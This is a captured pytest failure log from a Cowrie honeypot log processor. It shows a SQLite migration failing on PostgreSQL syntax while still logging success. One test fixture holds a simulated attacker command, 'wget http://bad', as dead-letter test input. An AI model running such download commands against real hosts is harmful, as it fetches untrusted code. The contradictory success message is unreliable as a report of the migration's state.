        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:25,749:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:25,749:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:25,751:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:25,751:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:25,752:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:25,752:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:25,753:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:25,753:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:25,754:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:25,754:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:25,754:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:25,754:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
Snowshoe detection schema migration (v8) completed successfully
Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
___________________ test_delta_loader_handles_file_rotation ____________________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_delta_loader_handles_file0')

    def test_delta_loader_handles_file_rotation(tmp_path) -> None:
        """When a file is rewritten with a new inode, delta loader should reprocess events."""
        source = tmp_path / "cowrie.log"
        _write_events(
            source,
            [{"session": "r1", "eventid": "cowrie.session.connect", "timestamp": "2024-02-01T10:00:00Z"}],
        )
    
>       engine = _make_engine(tmp_path)

/home/speterson/cowrieprocessor/tests/unit/test_delta_loader.py:89: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_delta_loader.py:33: in _make_engine
    apply_migrations(engine)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x77566f458670>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:26,333:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:26,333:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
Successfully executed: Set default source_generation values
Successfully executed: Set default source_generation values
2025-10-18 18:32:26,334:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:26,334:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
Successfully executed: Create unique index on raw_events
Successfully executed: Create unique index on raw_events
2025-10-18 18:32:26,342:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:26,342:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
Successfully executed: Populate session_id from JSON (SQLite)
Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:26,343:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:26,343:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
Successfully executed: Populate event_type from JSON (SQLite)
Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:26,345:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:26,345:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
Successfully executed: Populate event_timestamp from JSON (SQLite)
Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:26,349:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:26,349:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:26,351:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:26,351:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:26,352:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:26,352:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:26,355:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:26,355:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:26,356:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:26,356:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:26,358:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:26,358:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
SQLite boolean defaults for files.vt_malicious will be set on next schema creation
SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:26,361:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:26,361:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:26,362:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:26,362:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
Starting snowshoe detection schema migration (v8)
Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:26,363:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:26,363:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:26,365:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:26,365:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:26,367:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:26,367:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:26,367:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:26,367:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:26,368:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:26,368:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:26,369:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:26,369:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:26,370:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:26,370:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
Snowshoe detection schema migration (v8) completed successfully
Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
____________________ test_delta_loader_records_dead_letters ____________________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_delta_loader_records_dead0')

    def test_delta_loader_records_dead_letters(tmp_path) -> None:
        """Invalid events should populate the dead-letter queue instead of raw table."""
        source = tmp_path / "dlq.log"
        _write_events(source, [{"session": "dlq1", "eventid": "cowrie.command.input", "input": "wget http://bad"}])
    
>       engine = _make_engine(tmp_path)

/home/speterson/cowrieprocessor/tests/unit/test_delta_loader.py:128: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_delta_loader.py:33: in _make_engine
    apply_migrations(engine)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
